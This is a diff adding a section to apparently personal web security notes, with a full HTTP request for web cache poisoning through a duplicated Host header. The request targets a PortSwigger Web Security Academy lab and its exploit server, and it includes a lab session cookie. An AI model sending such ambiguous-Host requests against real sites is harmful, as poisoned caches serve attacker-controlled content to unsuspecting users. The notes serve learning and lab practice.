@@ -65,3 +65,28 @@ Trying to change `Host` value to burpsuite collaborator -> server send response 
 
 **Reference**:
 https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#Host%Overriding
+
+### Web cache poisoning via ambiguous requests
+**Payload** :
+```http
+GET /?dfa=ad HTTP/1.1
+Host: 0a6f002b03e892d080a21ccf00ef0024.h1-web-security-academy.net
+Cookie: session=fDV3XN2HXqqK7TlXADD6OWNckzar00An; _lab=46%7cMCwCFDzAOA93J2%2bI3PiEej0Vodx5NLcCAhRTGIl%2bGKihJePGQHv2MOdGgADFO2RMwDAA8toweaeqxVRPz5W7aPIBgsCW8DlxB0uSD0H86K8NgBTTsLlcDkcsM%2fwDNv2FPykIkCLR3KtKuuQwXXZfEi2WiL%2b6QrtubrDKdztSx2F0CHuKpPg%3d
+Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+Connection: keep-alive
+Host: exploit-0a7800f103fe9273806f1b6c01ae00f4.exploit-server.net
+
+
+```
